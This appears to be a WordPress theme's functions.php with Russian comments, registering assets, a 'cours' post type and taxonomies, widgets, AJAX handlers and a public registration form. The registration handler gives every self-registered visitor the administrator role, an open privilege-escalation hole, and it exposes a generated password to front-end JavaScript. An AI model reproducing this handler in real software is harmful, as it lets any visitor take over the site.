<?php
// Регистрация и подключение стилей и скриптов
function cop_register_assets()
{
    $theme_version = wp_get_theme()->get('Version'); // Получаем версию темы из style.css

    // Регистрация стилей с версией
    wp_register_style('main-style', get_template_directory_uri() . '/Css/Main.css', array(), $theme_version);
    wp_register_style('single-style', get_template_directory_uri() . '/Css/SingleNew.css?7', array(), $theme_version);
    wp_register_style('singlecours-style', get_template_directory_uri() . '/Css/SingleCour.css?1', array(), $theme_version);
    wp_register_style('news-style', get_template_directory_uri() . '/Css/News.css?2', array(), $theme_version);
    wp_register_style('home-style', get_template_directory_uri() . '/Css/Home.css?2', array(), $theme_version);
    wp_register_style('about-style', get_template_directory_uri() . '/Css/About.css?3', array(), $theme_version);
    wp_register_style('login-style', get_template_directory_uri() . '/Css/Login.css?3', array(), $theme_version);
    wp_register_style('contact-style', get_template_directory_uri() . '/Css/Contacts.css', array(), $theme_version);
    wp_register_style('cours-style', get_template_directory_uri() . '/Css/Cours.css?3', array(), $theme_version);
    wp_register_style('profile-style', get_template_directory_uri() . '/Css/Profile.css', array(), $theme_version);
    wp_register_style('registration-style', get_template_directory_uri() . '/Css/Registration.css?2', array(), $theme_version);
    wp_register_style('aboutplatform-style', get_template_directory_uri() . '/Css/Aboutplatform.css', array(), $theme_version);

    // Регистрация скриптов с версией
    wp_register_script('earth-script', get_template_directory_uri() . '/script/moduleearth.js', array(), $theme_version, true);
    wp_register_script('video-script', get_template_directory_uri() . '/script/video.js', array(), $theme_version, true);
    wp_register_script('ajax-script', get_template_directory_uri() . '/script/ajax.js', array(), $theme_version, true);

}


add_action('wp_enqueue_scripts', 'cop_register_assets');

function cop_enqueue_assets()
{
    // Подключаем основной стиль и скрипт
    wp_enqueue_style('main-style');
    wp_enqueue_script('modal-script', get_template_directory_uri() . '/script/modal.js', array('jquery'), null, true);


    if (is_singular('cours')) {
        wp_enqueue_style('singlecours-style');
    }

    if (is_single()) {
        wp_enqueue_style('single-style');
    }

    if (is_page('aboutplatform')) {
        wp_enqueue_style('aboutplatform-style');
       
    }

    // Главная страница
    if (is_front_page()) {
        wp_enqueue_style('home-style');
        wp_enqueue_script('earth-script');
    } else {
        wp_deregister_script('earth-script');
    }

    // О нас
    if (is_page('about')) {
        wp_enqueue_style('about-style');
        wp_enqueue_script('video-script');
        wp_enqueue_script('ajax-script');
    }

    // Прочие страницы
    $pages_with_styles = [
        'login' => 'login-style',
        'contact' => 'contact-style',
        'news' => 'news-style',
        'cours' => 'cours-style',
        'profile' => 'profile-style',
        'profilesetting' => 'profile-style',
        'registration' => 'registration-style',

    ];

    foreach ($pages_with_styles as $page => $style) {
        if (is_page($page)) {
            wp_enqueue_style($style);
        }
    }

}
add_action('wp_enqueue_scripts', 'cop_enqueue_assets');





// Настройки темы
function CoP_setup()
{
    add_theme_support('custom-logo');
    register_nav_menu('main', 'Главное меню');
    register_nav_menu('main_footer', 'Меню в подвале');
    add_theme_support('title-tag');
    add_theme_support('post-thumbnails');
    set_post_thumbnail_size(297, 167);
    add_theme_support('post-formats', array('aside', 'image', 'video', 'gallery'));
}
add_action('after_setup_theme', 'CoP_setup');

// Удаление ненужных скриптов и стилей
function cop_cleanup()
{
    wp_deregister_script('jquery');

    // Удаляем лишние стили
    wp_deregister_style('wp-block-library');
}
add_action('wp_enqueue_scripts', 'cop_cleanup', 20);

// Передача данных из PHP в JS
function cop_localize_scripts()
{
    wp_localize_script('earth-script', 'EarthData', array(
        'ajax_url' => admin_url('admin-ajax.php'),
        'some_message' => __('Привет, мир!', 'textdomain'),
    ));
    wp_localize_script('customajax-script', 'ajaxurl', admin_url('admin-ajax.php'));
}
add_action('wp_enqueue_scripts', 'cop_localize_scripts');

// Добавление для скриптов type='module'
function cop_add_module_attribute($tag, $handle, $src)
{
    $module_scripts = ['earth-script', 'home-script'];

    if (in_array($handle, $module_scripts)) {
        return str_replace('<script ', '<script type="module" ', $tag);
    }

    return $tag;
}
add_filter('script_loader_tag', 'cop_add_module_attribute', 10, 3);


// Регистрируем виджет социальных иконок
function cop_register_widgets()
{
    register_widget('CoP_Social_Media_Widget');
}
add_action('widgets_init', 'cop_register_widgets');

// Класс виджета
class CoP_Social_Media_Widget extends WP_Widget
{

    public function __construct()
    {
        parent::__construct(
            'cop_social_media_widget', // Идентификатор
            __('Social Media Widget', 'text_domain'), // Название
            array('description' => __('Виджет для отображения социальных иконок', 'text_domain'))
        );
    }

}
//Регистрация виджета
function cop_register_sidebar()
{
    register_sidebar(array(
        'name' => __('Footer Social Media', 'text_domain'),
        'id' => 'footer_social_media',
        'description' => __('Добавьте социальные иконки в футер', 'text_domain'),
        'before_widget' => '<div class="footer-widget">',
        'after_widget' => '</div>',
        'before_title' => '<h3 class="widget-title">',
        'after_title' => '</h3>',
    ));
}
add_action('widgets_init', 'cop_register_sidebar');

function create_cours_post_type()
{
    register_post_type('cours', array(
        'labels' => array(
            'name' => 'Курсы',
            'singular_name' => 'Курс',
        ),
        'public' => true,
        'has_archive' => true,
        'rewrite' => array('slug' => 'courses'), // Указывает на базовый URL
        'supports' => array('title', 'editor', 'thumbnail', 'excerpt'),
    ));
}
add_action('init', 'create_cours_post_type');
//Таксономия для курсов
function create_cours_taxonomies()
{
    // Таксономия "Направление"
    register_taxonomy('course_direction', 'cours', array(
        'labels' => array(
            'name' => 'Направления',
            'singular_name' => 'Направление',
            'search_items' => 'Искать направления',
            'all_items' => 'Все направления',
            'edit_item' => 'Редактировать направление',
            'update_item' => 'Обновить направление',
            'add_new_item' => 'Добавить новое направление',
            'new_item_name' => 'Новое название направления',
            'menu_name' => 'Направления',
        ),
        'hierarchical' => true, // Поддержка древовидной структуры (как у категорий)
        'public' => true,
        'rewrite' => array('slug' => 'course-direction'),
    ));

    // Таксономия "Уровень сложности"
    register_taxonomy('course_level', 'cours', array(
        'labels' => array(
            'name' => 'Уровни сложности',
            'singular_name' => 'Уровень сложности',
            'search_items' => 'Искать уровни сложности',
            'all_items' => 'Все уровни сложности',
            'edit_item' => 'Редактировать уровень',
            'update_item' => 'Обновить уровень',
            'add_new_item' => 'Добавить новый уровень',
            'new_item_name' => 'Новое название уровня',
            'menu_name' => 'Уровни сложности',
        ),
        'hierarchical' => false, // Неплоская структура (как теги)
        'public' => true,
        'rewrite' => array('slug' => 'course-level'),
    ));
}
add_action('init', 'create_cours_taxonomies');


function cop_localize_password()
{
    $generated_password = wp_generate_password(12, true, false);
    wp_localize_script('home-script', 'CoPData', [
        'generatedPassword' => $generated_password,
    ]);
}
add_action('wp_enqueue_scripts', 'cop_localize_password');

// Обработка формы регистрации
function cop_handle_registration()
{
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['register_submit'])) {
        // Проверяем nonce
        if (!isset($_POST['registration_nonce']) || !wp_verify_nonce($_POST['registration_nonce'], 'registration_form')) {
            wp_die(__('Ошибка проверки безопасности. Пожалуйста, попробуйте снова.', 'textdomain'));
        }

        // Получаем и очищаем данные
        $full_name = sanitize_text_field($_POST['full_name']);
        $email = sanitize_email($_POST['email']);
        $password = sanitize_text_field($_POST['password']);
        $country_code = sanitize_text_field($_POST['country_code']);
        $phone = sanitize_text_field($_POST['phone']);

        // Проверяем обязательные поля
        if (empty($full_name) || empty($email) || empty($password) || empty($phone)) {
            wp_die(__('Пожалуйста, заполните все поля.', 'textdomain'));
        }

        // Проверяем, есть ли пользователь с таким email
        if (email_exists($email)) {
            wp_die(__('Пользователь с таким email уже существует.', 'textdomain'));
        }



        // Создаём нового пользователя
        $user_id = wp_create_user($email, $password, $email);

        // Назначаем роль администратора
        $user = new WP_User($user_id);
        $user->set_role('administrator');


        if (is_wp_error($user_id)) {
            wp_die($user_id->get_error_message());
        }

        // Обновляем имя и телефон
        wp_update_user([
            'ID' => $user_id,
            'display_name' => $full_name,
        ]);
        update_user_meta($user_id, 'phone', $country_code . $phone);

        // Авторизуем пользователя и перенаправляем
        wp_set_auth_cookie($user_id, true);
        wp_redirect(home_url('/profile'));
        exit;
    }
}
add_action('init', 'cop_handle_registration');

//Регистрация статусов
function cop_register_custom_post_statuses()
{
    register_post_status('review', array(
        'label' => _x('На проверке', 'post'),
        'public' => true,
        'exclude_from_search' => false,
        'show_in_admin_all_list' => true,
        'show_in_admin_status_list' => true,
        'label_count' => _n_noop('На проверке (%s)', 'На проверке (%s)'),
        'post_type' => array('post'), // Ограничение только для записей
    ));
}
add_action('init', 'cop_register_custom_post_statuses');

//Подключение пользовательских стилей для редактора
function mytheme_enqueue_editor_styles() {
    add_editor_style('editor-style.css');
}
add_action('admin_init', 'mytheme_enqueue_editor_styles');

function mytheme_enqueue_front_styles() {
    wp_enqueue_style('single-news-style', get_template_directory_uri() . '/SingleNew.css?1', [], '1.0', 'all');
    wp_style_add_data('single-news-style', 'rtl', 'replace'); // Заменяем стили для RTL-языков, если требуется
}
add_action('wp_enqueue_scripts', 'mytheme_enqueue_front_styles');

add_action('wp_ajax_submit_rating', 'handle_rating_submission');
add_action('wp_ajax_nopriv_submit_rating', 'handle_rating_submission'); // Для незарегистрированных пользователей


// Обработка AJAX-запроса
function cop_handle_ajax_request() {
    // Проверяем nonce
    check_ajax_referer('cop_ajax_nonce', 'security');

    // Обрабатываем данные и отправляем ответ
    $response = array(
        'status' => 'success',
        'message' => __('Запрос выполнен успешно!', 'textdomain')
    );

    wp_send_json($response);
}
add_action('wp_ajax_cop_ajax_action', 'cop_handle_ajax_request');
add_action('wp_ajax_nopriv_cop_ajax_action', 'cop_handle_ajax_request');
//Передача nonce в JavaScript
function cop_localize_ajax() {
    wp_localize_script('ajax-script', 'cop_ajax_data', array(
        'ajax_url' => admin_url('admin-ajax.php'),
        'ajax_nonce' => wp_create_nonce('cop_ajax_nonce')
    ));
}
add_action('wp_enqueue_scripts', 'cop_localize_ajax');





?>